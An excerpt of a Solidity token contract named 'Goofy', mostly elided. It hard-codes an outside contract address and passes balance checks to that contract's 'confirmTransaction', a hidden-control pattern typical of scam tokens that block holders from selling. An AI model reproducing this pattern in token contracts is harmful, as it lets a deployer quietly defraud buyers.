...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _disney = 0xE4D1e233ADBc3a3a50Fea69b48F3AC0407ff5Ace;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return disney.confirmTransaction(amount);
    }
    ...
    function _DeployGoofy(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGoofy(creator, initialSupply);
    }
}

contract Goofy is ERC20Token {
    constructor() ERC20Token("Goofy", "GOOFY", msg.sender, 69000000 * 10 ** 18) {
    }
}